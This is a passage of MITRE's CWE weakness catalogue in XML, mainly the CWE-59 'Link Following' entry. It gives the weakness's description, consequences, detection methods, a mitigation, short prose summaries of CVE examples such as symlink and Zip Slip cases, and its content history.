					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Detection_Factors, References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="59" Name="Improper Link Resolution Before File Access ('Link Following')" Abstraction="Base" Structure="Simple" Status="Draft">
         <ns0:Description>The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.</ns0:Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1003" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Weakness_Ordinalities>
            <ns0:Weakness_Ordinality>
               <ns0:Ordinality>Resultant</ns0:Ordinality>
            </ns0:Weakness_Ordinality>
         </ns0:Weakness_Ordinalities>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
            <ns0:Operating_System Class="Windows" Prevalence="Sometimes" />
            <ns0:Operating_System Class="Unix" Prevalence="Often" />
         </ns0:Applicable_Platforms>
         <ns0:Background_Details>
            <ns0:Background_Detail>Soft links are a UNIX term that is synonymous with simple shortcuts on Windows-based platforms.</ns0:Background_Detail>
         </ns0:Background_Details>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>insecure temporary file</ns0:Term>
               <ns0:Description>Some people use the phrase "insecure temporary file" when referring to a link following weakness, but other weaknesses can produce insecure temporary files without any symlink involvement at all.</ns0:Description>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>Zip Slip</ns0:Term>
               <ns0:Description>"Zip slip" is an attack that uses file archives (e.g., ZIP, tar, rar, etc.) that contain filenames with path traversal sequences that cause the files to be written outside of the directory under which the archive is expected to be extracted [REF-1282]. It is most commonly used for relative path traversal (CWE-23) and link following (CWE-59).</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</ns0:Note>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>Medium</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Read Files or Directories</ns0:Impact>
               <ns0:Impact>Modify Files or Directories</ns0:Impact>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Note>An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Other</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Note>Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a ".LNK" file can be uploaded like a normal file. This can enable remote execution.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Automated Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Web Application Scanner</html:li>
                           <html:li>Web Services Scanner</html:li>
                           <html:li>Database Scanners</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Manual Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Fuzz Tester</html:li>
                           <html:li>Framework-based Fuzzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Focused Manual Spotcheck - Focused manual analysis of source</html:li>
                           <html:li>Manual Source Code Review (not inspections)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Source code Weakness Analyzer</html:li>
                           <html:li>Context-configured Source Code Weakness Analyzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Architecture or Design Review</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Formal Methods / Correct-By-Construction</html:li>
                        </html:ul>
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation Mitigation_ID="MIT-48.1">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Separation of Privilege</ns0:Strategy>
               <ns0:Description>
                  <html:p>Follow the principle of least privilege when assigning access rights to entities in a software system.</html:p>
                  <html:p>Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-1999-1386</ns0:Reference>
               <ns0:Description>Some versions of Perl follow symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-1999-1386</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2000-1178</ns0:Reference>
               <ns0:Description>Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2000-1178</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0217</ns0:Reference>
               <ns0:Description>Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0217</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0517</ns0:Reference>
               <ns0:Description>Symlink attack allows local users to overwrite files.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0517</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0689</ns0:Reference>
               <ns0:Description>Window manager does not properly handle when certain symbolic links point to "stale" locations, which could allow local users to create or truncate arbitrary files.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0689</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1879</ns0:Reference>
               <ns0:Description>Second-order symlink vulnerabilities</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1879</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1880</ns0:Reference>
               <ns0:Description>Second-order symlink vulnerabilities</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1880</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1916</ns0:Reference>
               <ns0:Description>Symlink in Python program</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1916</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2000-0972</ns0:Reference>
               <ns0:Description>Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2000-0972</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-0824</ns0:Reference>
               <ns0:Description>Signal causes a dump that follows symlinks.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-0824</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1494</ns0:Reference>
               <ns0:Description>Hard link attack, file overwrite; interesting because program checks against soft links</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1494</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0793</ns0:Reference>
               <ns0:Description>Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0793</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0578</ns0:Reference>
               <ns0:Description>Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0578</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-1999-0783</ns0:Reference>
               <ns0:Description>Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-1999-0783</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-1603</ns0:Reference>
               <ns0:Description>Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-1603</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-1901</ns0:Reference>
               <ns0:Description>Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-1901</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1111</ns0:Reference>
               <ns0:Description>Hard link race condition</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1111</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2000-0342</ns0:Reference>
               <ns0:Description>Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka "Stealth Attachment."</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2000-0342</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1042</ns0:Reference>
               <ns0:Description>FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1042</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1043</ns0:Reference>
               <ns0:Description>FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1043</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-0587</ns0:Reference>
               <ns0:Description>Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-0587</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1386</ns0:Reference>
               <ns0:Description>".LNK." - .LNK with trailing dot</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1386</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-1233</ns0:Reference>
               <ns0:Description>Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-1233</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0725</ns0:Reference>
               <ns0:Description>File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0725</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0844</ns0:Reference>
               <ns0:Description>Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0844</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2015-3629</ns0:Reference>
               <ns0:Description>A Libcontainer used in Docker Engine allows local users to escape containerization and write to an arbitrary file on the host system via a symlink attack in an image when respawning a container.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2015-3629</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-21272</ns0:Reference>
               <ns0:Description>"Zip Slip" vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-21272</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-27833</ns0:Reference>
               <ns0:Description>"Zip Slip" vulnerability in container management product allows writing arbitrary files outside intended directory via a container image (.tar format) with filenames that are symbolic links that point to other files within the same tar file; however, the files being pointed to can also be symbolic links to destinations outside the intended directory, bypassing the initial check.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-27833</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Functional_Areas>
            <ns0:Functional_Area>File Processing</ns0:Functional_Area>
         </ns0:Functional_Areas>
         <ns0:Affected_Resources>
            <ns0:Affected_Resource>File or Directory</ns0:Affected_Resource>
         </ns0:Affected_Resources>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Link Following</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>FIO02-C</ns0:Entry_ID>
               <ns0:Entry_Name>Canonicalize path names originating from untrusted sources</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>POS01-C</ns0:Entry_ID>
               <ns0:Entry_Name>Check for the existence of links when dealing with files</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <ns0:Entry_ID>FIO01-PL</ns0:Entry_ID>
               <ns0:Entry_Name>Do not operate on files that can be modified by untrusted users</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <ns0:Entry_ID>SFP18</ns0:Entry_ID>
               <ns0:Entry_Name>Link in resource name resolution</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="132" />
            <ns0:Related_Attack_Pattern CAPEC_ID="17" />
            <ns0:Related_Attack_Pattern CAPEC_ID="35" />
            <ns0:Related_Attack_Pattern CAPEC_ID="76" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 9, &quot;Symbolic Link Attacks&quot;, Page 518" />
            <ns0:Reference External_Reference_ID="REF-1282" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Theoretical">
               <html:p>Link following vulnerabilities are Multi-factor Vulnerabilities (MFV). They are the combination of multiple elements: file or directory permissions, filename predictability, race conditions, and in some cases, a design limitation in which there is no mechanism for performing atomic file creation operations.</html:p>
               <html:p>Some potential factors are race conditions, permissions, and predictability.</html:p>
            </ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-01-12</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Name</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Background_Details, Other_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-04-05</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Observed_Examples, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Other_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Affected_Resources, Applicable_Platforms, Causal_Nature, Common_Consequences, Functional_Areas, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Research_Gaps</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
